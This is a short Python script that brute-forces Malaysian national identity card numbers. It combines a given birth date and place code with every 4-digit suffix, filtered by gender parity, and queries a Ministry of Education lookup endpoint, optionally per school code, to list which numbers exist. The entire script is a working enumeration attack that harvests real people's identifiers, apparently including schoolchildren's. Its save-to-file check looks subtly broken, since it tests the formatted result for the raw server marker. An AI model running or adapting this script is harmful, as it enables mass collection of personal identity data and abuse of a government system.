import os
import sys
import platform
from urllib.request import urlopen

birth_date = str (input("Please enter the birth date : (030531) "))
place_of_birth = str (input("Please enter the place of birth : (13) "))
gender = str (input("Please enter the gender : (female)(If no just keep it blank) "))
school_code = str (input("Please enter the school code : (YCC4102)(If no just keep it blank) ")) #YCC4102
existed_numbers = []

def clear_screen():
    try:
        if platform.uname().system in ("Linux","Darwin"):
            os.system("clear")
        elif platform.uname().system == "Windows":
            os.system("cls")
    except:
        pass

def write_in_file() :
    with open (os.path.join(sys.path[0], 'identity_numbers.txt'), 'a', encoding='utf-8') as file:
        if "b'Wujud" in response :
            existed_numbers.append(birth_date + place_of_birth + four_digits_number)
            file.write(birth_date + place_of_birth + four_digits_number + "\n")

def get_response(school_code, birth_date, place_of_birth, four_digits_number) :
    loop = True
    while loop :
        try :
            if school_code == "" :
                response = str (urlopen ("https://sapsnkra.moe.gov.my/ajax/papar_carian.php?nokp=" + birth_date + place_of_birth + four_digits_number).read() )
                if ("b'Wujud" in response) : 
                    confirmation = str (birth_date + place_of_birth + four_digits_number + "\tTrue")
                else : 
                    confirmation = str (birth_date + place_of_birth + four_digits_number + "\tFalse")
                loop = False
                return confirmation
            elif school_code != "" :
                response = str (urlopen ("https://sapsnkra.moe.gov.my/ajax/papar_carianpelajar.php?nokp=" + birth_date + place_of_birth + four_digits_number + "&kodsek=" + school_code).read() )
                if ("b'Wujud" in response) : 
                    confirmation = str (birth_date + place_of_birth + four_digits_number + "\t" + school_code + "\t   True")
                else : 
                    confirmation = str (birth_date + place_of_birth + four_digits_number + "\t" + school_code + "\t   False")
                loop = False
                return confirmation
        except :
            pass


clear_screen()
for i in range(9999):
    if gender == "male" :
        if i%2 != 0:
            four_digits_number = (f'{i:04}')
            response = get_response(school_code, birth_date, place_of_birth, four_digits_number)
            print(response)
            write_in_file()

    elif gender == "female" :
        if i%2 == 0:
            four_digits_number = (f'{i:04}')
            response = get_response(school_code, birth_date, place_of_birth, four_digits_number)
            print(response)
            write_in_file()

    elif gender == "" :
        four_digits_number = (f'{i:04}')
        response = get_response(school_code, birth_date, place_of_birth, four_digits_number)
        print(response)
        write_in_file()
